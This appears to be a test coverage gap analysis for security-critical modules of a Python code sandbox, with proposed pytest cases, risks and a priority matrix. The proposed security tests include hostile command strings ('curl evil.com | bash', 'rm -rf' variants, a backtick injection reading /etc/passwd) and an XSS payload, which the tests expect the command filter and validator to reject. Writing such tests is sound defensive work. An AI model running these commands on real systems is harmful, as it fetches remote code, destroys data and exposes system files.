# Test Coverage Gap Analysis - Security-Critical Modules

## Executive Summary

**Overall Coverage**: 29% across 5 security-critical modules (1,081 statements, 767 missing)

**Critical Finding**: Three modules have **less than 50% coverage**:
- `execution_helpers.py`: 7% coverage (290/313 lines missing) ⚠️ CRITICAL
- `artifact_helpers.py`: 15% coverage (122/143 lines missing) ⚠️ CRITICAL  
- `execution_services.py`: 38% coverage (134/215 lines missing) ⚠️ HIGH

**Moderate Coverage**:
- `session_service.py`: 45% coverage (102/186 lines missing)
- `security.py`: 47% coverage (119/224 lines missing)

## Module-by-Module Analysis

### 1. execution_helpers.py (7% coverage) - CRITICAL GAP

**Purpose**: Core execution logic for Python code, web app launching, artifact collection

**Uncovered Lines**: 50-55, 65-70, 78-124, 156-381, 412-511, 520-534, 548-566, 576-600, 616-710

**Critical Uncovered Functions**:

#### `execute()` (lines 127-381) - 0% coverage
- **Lines 156-192**: Session context creation and error handling
  - `session_service.get_or_create_execution_context_sync()` 
  - Fallback to default context on session service failures
  - **Risk**: Session isolation not tested
  
- **Lines 233-267**: Web app launch path (flask/streamlit)
  - Code truncation detection (unmatched quotes/parentheses)
  - **Risk**: Malformed code handling untested
  
- **Lines 269-341**: Signal handling and system error recovery
  - Signal handlers for SIGSEGV, SIGFPE, SIGILL
  - RuntimeError handling for system-level errors
  - **Risk**: Process crash recovery untested

#### `execute_with_artifacts()` (lines 384-511) - 0% coverage
- **Lines 412-427**: Session context integration
- **Lines 434-443**: Artifact tracking before execution
- **Lines 491-509**: Artifact diff reporting
- **Risk**: Artifact tracking and session isolation untested

#### `launch_web_app()` (lines 603-712) - 0% coverage
- **Lines 620-648**: Flask app launch with thread pool
  - `find_free_port()` atomic binding
  - `_wait_for_server_ready()` timeout handling
- **Lines 650-697**: Streamlit app launch with subprocess
  - Script file creation in artifacts_dir
  - Process handle cleanup on errors
- **Risk**: Web app security, process cleanup, port binding untested

#### Helper Functions - 0% coverage
- `find_free_port()` (lines 514-534): SO_EXCLUSIVEADDRUSE port binding
- `_wait_for_server_ready()` (lines 537-566): Server readiness verification
- `_drain_pipe()` (lines 569-600): Pipe deadlock prevention

---

### 2. artifact_helpers.py (15% coverage) - CRITICAL GAP

**Purpose**: Artifact backup, categorization, and export services

**Uncovered Lines**: 18-44, 49-61, 66-75, 80-93, 105-121, 134-150, 166-213, 224-237, 248-268, 281-293, 305-324, 335-375

**Critical Uncovered Functions**:

#### Backup Services (lines 1-150) - 0% coverage
- **Lines 18-44**: `create_timestamped_backup()`
  - Timestamp-based backup directory creation
  - Error handling for filesystem operations
- **Lines 49-75**: `compress_backup_directory()`
  - Zip file creation with compression
- **Lines 80-121**: `restore_from_backup()`
  - Backup restoration with validation
- **Risk**: Data loss, backup integrity untested

#### Categorization (lines 134-213) - 0% coverage
- **Lines 134-150**: `categorize_artifact_by_type()`
  - File type detection (images, videos, models, etc.)
- **Lines 166-213**: `get_artifact_metadata()`
  - Metadata extraction (dimensions, format, size)
- **Risk**: Artifact processing edge cases untested

#### Export Services (lines 224-375) - 0% coverage
- **Lines 224-268**: `export_artifact_as_base64()`
  - Large file handling with chunking
- **Lines 281-293**: `export_multiple_artifacts()`
  - Batch export with archive creation
- **Lines 305-375**: `download_artifact()` and `download_artifact_batch()`
  - HTTP download with progress tracking
- **Risk**: Large file handling, network operations untested

---

### 3. execution_services.py (38% coverage) - HIGH GAP

**Purpose**: ExecutionContext lifecycle management, execution tracking, transactions

**Uncovered Lines**: 50-53, 57, 80-84, 92, 98-99, 106-120, 124-150, 154-155, 159, 167-178, 182-212, 220-255, 303, 318-333, 342-344, 353-354, 361-382, 391-392, 402-409, 426-456, 471-473

**Critical Uncovered Functions**:

#### `ExecutionContext.__init__()` (lines 33-78) - Partial coverage
- **Lines 50-57**: Virtual environment detection and sys.path mutation
  - `.venv` directory detection
  - Site-packages path injection
- **Risk**: Python environment isolation untested

#### State Management (lines 92-150) - 0% coverage
- **Lines 92-99**: `_load_state()` - SQLite state persistence
- **Lines 106-120**: `_save_state()` - State serialization (JSON/pickle)
- **Lines 124-150**: `_initialize_execution_globals()` - globals setup
- **Risk**: State corruption, pickle attacks untested

#### Execution Tracking (lines 154-212) - 0% coverage
- **Lines 154-178**: `start_execution()` - execution tracking
- **Lines 182-212**: `end_execution()` - metrics collection
- **Risk**: Execution history, timing attacks untested

#### Transaction Support (lines 220-255) - 0% coverage
- **Lines 220-255**: `begin_transaction()`, `commit_transaction()`, `rollback_transaction()`
- **Risk**: State rollback, transaction integrity untested

#### Process Execution (lines 303-473) - Partial coverage
- **Lines 303-333**: `execute_command()` - shell command execution
  - Resource limit checks
  - Security manager integration
- **Lines 342-344**: `execute_command_async()` - async execution
- **Risk**: Command injection, resource exhaustion untested

---

### 4. session_service.py (45% coverage) - MODERATE GAP

**Purpose**: Multi-session execution context management with isolation

**Uncovered Lines**: 53-60, 77-79, 94-103, 107-120, 124-128, 195-196, 206, 214, 228-234, 244-247, 260-267, 276-277, 288-289, 303-307, 324-332, 341-344, 353-356, 377-395, 407-408, 425-445, 457-459, 471-474, 486-488

**Critical Uncovered Functions**:

#### Session Lifecycle (lines 53-128) - Partial coverage
- **Lines 53-60**: `create_session()` - session creation
- **Lines 77-79**: `get_session()` - session retrieval
- **Lines 94-103**: `delete_session()` - cleanup
- **Lines 107-120**: `list_sessions()` - enumeration
- **Risk**: Session lifecycle management untested

#### Context Management (lines 195-234) - 0% coverage
- **Lines 195-196**: `get_execution_context()` - context retrieval
- **Lines 206**: `create_execution_context()` - context creation
- **Lines 214**: `remove_execution_context()` - context removal
- **Risk**: Context isolation untested

#### Synchronous Context Access (lines 260-332) - 0% coverage
- **Lines 260-267**: `get_or_create_execution_context_sync()` 
- **Lines 276-277**: `get_execution_context_sync()`
- **Lines 288-289**: `remove_execution_context_sync()`
- **Lines 303-307**: `_create_context_internal()` - context factory
- **Risk**: Race conditions, synchronization untested

#### Session Statistics (lines 341-488) - 0% coverage
- **Lines 341-344**: `get_session_statistics()` - metrics
- **Lines 353-356**: `get_all_session_statistics()` - batch metrics
- **Lines 377-395**: `cleanup_inactive_sessions()` - reclamation
- **Lines 407-408**: `get_active_session_count()` - counting
- **Lines 425-445**: `backup_session_state()` - backup
- **Lines 457-459**: `restore_session_state()` - restore
- **Risk**: Memory leaks, backup integrity untested

---

### 5. security.py (47% coverage) - MODERATE GAP

**Purpose**: Command filtering, filesystem security, network security, input validation

**Uncovered Lines**: 175-183, 188-196, 230-237, 246-253, 265-268, 272-279, 299-308, 320-337, 341-346, 350, 385-401, 405-415, 420-431, 436-445, 457-467, 478-486, 490-509, 532-551, 559, 563, 567, 571

**Critical Uncovered Functions**:

#### CommandFilter (lines 146-198) - Partial coverage
- **Lines 175-183**: Network pattern detection
- **Lines 188-196**: Filesystem pattern detection
- **Risk**: Network/filesystem bypasses untested

#### FileSystemSecurity (lines 211-279) - Partial coverage
- **Lines 230-237**: Allowed path validation with `is_relative_to()`
- **Lines 246-253**: Dangerous file extension filtering
- **Lines 265-268**: Sandbox directory creation
- **Lines 272-279**: Sandbox cleanup
- **Risk**: Path traversal, directory escape untested

#### NetworkSecurity (lines 289-350) - 0% coverage
- **Lines 299-308**: `is_port_allowed()` - port validation
- **Lines 320-337**: `allocate_port()` - port allocation
- **Lines 341-346**: `_is_port_available()` - port availability check
- **Risk**: Port hijacking, privilege escalation untested

#### InputValidator (lines 373-445) - 0% coverage
- **Lines 385-401**: `validate_input()` - input validation
- **Lines 405-415**: `_validate_code()` - code validation
- **Lines 420-431**: `_validate_command()` - command injection detection
- **Lines 436-445**: `_validate_filename()` - path traversal detection
- **Risk**: XSS, command injection, path traversal untested

#### SecurityAuditor (lines 455-514) - 0% coverage
- **Lines 457-467**: `log_violation()` - audit logging
- **Lines 478-486**: `get_violations()` - violation retrieval
- **Lines 490-509**: `get_security_summary()` - statistics
- **Risk**: Audit trail, forensics untested

#### SecurityManager (lines 529-577) - Partial coverage
- **Lines 532-551**: `check_command_security()` - integrated security checks
- **Lines 559**: `allocate_secure_port()` - secure port allocation
- **Lines 563**: `create_secure_workspace()` - sandbox creation
- **Lines 567**: `cleanup_security_resources()` - resource cleanup
- **Lines 571-577**: `get_security_status()` - status reporting
- **Risk**: Security policy enforcement untested

---

## Test Recommendations by Category

### Category 1: Error Handling (HIGH PRIORITY)

#### execution_helpers.py
```python
# Test: Session service failure handling
def test_execute_session_service_unavailable():
    """Test fallback to default context when session service fails"""
    session_service = Mock(side_effect=RuntimeError("Service unavailable"))
    result = execute("print('test')", ctx, logger, launch_web_app, 
                     session_service=session_service, session_id="test")
    # Should fall back to default context and execute successfully

# Test: Signal handler registration
def test_execute_signal_handling():
    """Test signal handlers for SIGSEGV, SIGFPE, SIGILL"""
    # Mock signal.signal to verify handlers are registered
    # Test that handlers are restored in finally block

# Test: System error recovery
def test_execute_system_error():
    """Test RuntimeError handling for system-level errors"""
    # Mock exec to raise RuntimeError
    # Verify error structure contains "SystemError" type
```

#### artifact_helpers.py
```python
# Test: Backup creation failure
def test_create_backup_directory_exists():
    """Test handling when backup directory already exists"""
    # Create directory, then call create_timestamped_backup
    # Should handle gracefully or create new timestamped dir

# Test: Large file export
def test_export_large_artifact():
    """Test chunking for files > 10MB"""
    # Mock file with 50MB content
    # Verify chunking and base64 encoding
```

#### execution_services.py
```python
# Test: State corruption recovery
def test_load_state_corrupted():
    """Test handling of corrupted state database"""
    # Create invalid state.db
    # Should create fresh state or raise clear error

# Test: Transaction rollback
def test_rollback_transaction():
    """Test state rollback on transaction failure"""
    # Modify state, begin transaction, raise exception
    # Verify state restored to pre-transaction values
```

### Category 2: Edge Cases (HIGH PRIORITY)

#### execution_helpers.py
```python
# Test: Code truncation detection
def test_execute_unmatched_quotes():
    """Test detection of unmatched quotes in code"""
    code = 'print("hello'  # Missing closing quote
    result = execute(code, ctx, logger, launch_web_app)
    assert "unmatched quotes" in result["stderr"]

# Test: Web app port exhaustion
def test_launch_web_app_no_ports():
    """Test handling when no ports available"""
    # Mock find_free_port to raise RuntimeError
    # Should return None and log error
```

#### artifact_helpers.py
```python
# Test: Unknown file type
def test_categorize_unknown_filetype():
    """Test categorization of unknown file extensions"""
    # Create file with .xyz extension
    # Should categorize as "other" or "unknown"

# Test: Empty artifact directory
def test_export_empty_directory():
    """Test export when no artifacts exist"""
    # Call export with empty artifacts_dir
    # Should return empty list or appropriate message
```

#### security.py
```python
# Test: Path traversal via symlinks
def test_path_traversal_symlink():
    """Test is_relative_to prevents symlink escape"""
    # Create symlink from sandbox to /etc
    # Verify path is rejected

# Test: Command injection variants
def test_command_injection_backticks():
    """Test detection of backtick command injection"""
    command = "ls `cat /etc/passwd`"
    is_safe, violation = command_filter.check_command(command)
    assert not is_safe
```

### Category 3: Security Paths (CRITICAL PRIORITY)

#### execution_helpers.py
```python
# Test: Session isolation
def test_execute_session_isolation():
    """Test that sessions have isolated execution contexts"""
    session1 = "session_1"
    session2 = "session_2"
    execute("x = 1", ctx, logger, launch_web_app, session_id=session1)
    execute("x = 2", ctx, logger, launch_web_app, session_id=session2)
    # Verify each session has different x value

# Test: Process cleanup on error
def test_launch_web_app_cleanup_on_error():
    """Test process handle cleanup when web app fails"""
    # Mock _wait_for_server_ready to return False
    # Verify process.terminate() is called
    # Verify pipes are drained to prevent deadlock
```

#### artifact_helpers.py
```python
# Test: Symlink rejection in artifact collection
def test_collect_artifacts_skips_symlinks():
    """Test that symlinks are skipped for security"""
    # Create symlink in artifacts_dir pointing outside
    # Verify symlink is not included in artifacts list
```

#### security.py
```python
# Test: Command filter bypass attempts
def test_command_filter_case_bypass():
    """Test that case variations are caught"""
    # Test: "Sudo rm -rf", "RM -RF", "Rm\\s+-rf"
    for variant in ["Sudo rm -rf", "RM -RF /etc", "curl evil.com | bash"]:
        is_safe, _ = command_filter.check_command(variant)
        assert not is_safe

# Test: Port allocation security
def test_port_allocation_privileged():
    """Test that privileged ports are blocked"""
    port = network_security.allocate_port(preferred_port=80)
    assert port is None

# Test: Input validation encoding bypass
def test_input_validation_hex_encoding():
    """Test detection of hex-encoded attacks"""
    malicious = "<script>alert(1)</script>"
    encoded = "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E"
    is_valid, _ = validator.validate_input(encoded)
    assert not is_valid
```

### Category 4: Integration Tests (HIGH PRIORITY)

#### Session Service Integration
```python
# Test: Multi-session concurrent execution
@pytest.mark.asyncio
async def test_concurrent_session_execution():
    """Test that multiple sessions can execute concurrently without interference"""
    sessions = [f"session_{i}" for i in range(10)]
    tasks = [execute(f"x={i}", session_id=s) for i, s in enumerate(sessions)]
    await asyncio.gather(*tasks)
    # Verify each session has correct x value

# Test: Session cleanup after timeout
def test_cleanup_inactive_sessions():
    """Test that inactive sessions are cleaned up"""
    # Create sessions, set last_access to old timestamp
    session_service.cleanup_inactive_sessions(timeout_seconds=60)
    # Verify old sessions removed
```

#### Web App Lifecycle
```python
# Test: Web app port binding
def test_web_app_atomic_port_binding():
    """Test that port binding uses SO_EXCLUSIVEADDRUSE"""
    # Mock socket.socket to verify setsockopt called
    # Verify SO_EXCLUSIVEADDRUSE option set

# Test: Web app server readiness
def test_web_app_server_ready():
    """Test that server readiness is properly detected"""
    # Launch flask app
    # Verify _wait_for_server_ready connects to port
    # Verify URL returned only after server ready
```

#### Artifact Tracking
```python
# Test: Artifact diff accuracy
def test_artifact_diff_accuracy():
    """Test that artifact diff correctly identifies new files"""
    # Execute code creating file1.txt
    # Get artifacts_before
    # Execute code creating file2.txt
    # Verify artifacts_after contains only file2.txt

# Test: Artifact categorization
def test_artifact_categorization_comprehensive():
    """Test categorization of all supported file types"""
    file_types = {
        "plot.png": "images",
        "video.mp4": "videos",
        "model.pkl": "models",
        "data.json": "data",
        "script.py": "scripts",
    }
    # Create each file type
    # Verify correct categorization
```

---

## Priority Matrix

### CRITICAL (Fix Immediately)
1. **execution_helpers.py** - Session isolation (7% coverage)
   - Risk: Cross-session data leakage
   - Tests needed: 15-20
   
2. **artifact_helpers.py** - Symlink security (15% coverage)
   - Risk: Host file exfiltration
   - Tests needed: 8-12

3. **security.py** - Command filter bypasses (47% coverage)
   - Risk: Arbitrary code execution
   - Tests needed: 20-25

### HIGH (Fix This Sprint)
4. **execution_services.py** - State persistence (38% coverage)
   - Risk: Data corruption, pickle attacks
   - Tests needed: 10-15

5. **execution_helpers.py** - Process cleanup (7% coverage)
   - Risk: Resource leaks, zombie processes
   - Tests needed: 8-10

6. **session_service.py** - Concurrent access (45% coverage)
   - Risk: Race conditions, data corruption
   - Tests needed: 12-15

### MEDIUM (Fix Next Sprint)
7. **artifact_helpers.py** - Backup integrity (15% coverage)
   - Risk: Data loss
   - Tests needed: 10-12

8. **security.py** - Input validation (47% coverage)
   - Risk: XSS, injection attacks
   - Tests needed: 15-20

9. **execution_services.py** - Transaction support (38% coverage)
   - Risk: State inconsistency
   - Tests needed: 8-10

---

## Recommended Test File Structure

```
tests/unit/
├── test_execution_helpers_security.py       # NEW: Session isolation, process cleanup
├── test_execution_helpers_error_handling.py # NEW: Signal handling, system errors
├── test_artifact_helpers_security.py        # NEW: Symlink rejection, path validation
├── test_artifact_helpers_backup.py          # NEW: Backup creation, restoration
├── test_execution_services_state.py         # NEW: State persistence, transactions
├── test_execution_services_commands.py      # NEW: Command execution, resource limits
├── test_session_service_concurrency.py      # NEW: Concurrent access, race conditions
├── test_session_service_lifecycle.py        # NEW: Session cleanup, statistics
├── test_security_command_filter.py          # NEW: Command filter bypass tests
├── test_security_filesystem.py              # NEW: Path traversal, symlink escape
├── test_security_network.py                 # NEW: Port allocation, network security
└── test_security_input_validation.py        # NEW: XSS, injection, encoding bypass
```

---

## Success Metrics

### Target Coverage Goals
- **execution_helpers.py**: 7% → 80% (requires ~150 new test lines)
- **artifact_helpers.py**: 15% → 75% (requires ~100 new test lines)
- **execution_services.py**: 38% → 70% (requires ~80 new test lines)
- **session_service.py**: 45% → 75% (requires ~70 new test lines)
- **security.py**: 47% → 85% (requires ~120 new test lines)

### Overall Target
- **Current**: 29% (767/1081 lines missing)
- **Target**: 75%+ (~270 lines missing)
- **New Tests Needed**: ~520 test lines (est. 60-80 test functions)

### Validation Commands
```bash
# Run coverage for target modules
uv run pytest tests/unit/test_execution_helpers_*.py \
              tests/unit/test_artifact_helpers_*.py \
              tests/unit/test_execution_services_*.py \
              tests/unit/test_session_service_*.py \
              tests/unit/test_security_*.py \
    --cov=sandbox.server.execution_helpers \
    --cov=sandbox.server.artifact_helpers \
    --cov=sandbox.core.execution_services \
    --cov=sandbox.server.session_service \
    --cov=sandbox.core.security \
    --cov-report=term-missing \
    --cov-report=html \
    -v

# Verify security tests pass
uv run pytest tests/unit/test_security_*.py -v

# Verify session isolation tests pass
uv run pytest tests/unit/test_session_service_*.py -v

# Run full test suite
uv run pytest tests/ -v
```

---

## Next Steps

1. **Create test tasks** for each critical gap
2. **Prioritize CRITICAL paths** (session isolation, symlink security, command filter)
3. **Write tests incrementally** starting with highest-risk areas
4. **Run coverage after each test** to verify progress
5. **Document edge cases** discovered during testing
6. **Update security documentation** with test scenarios
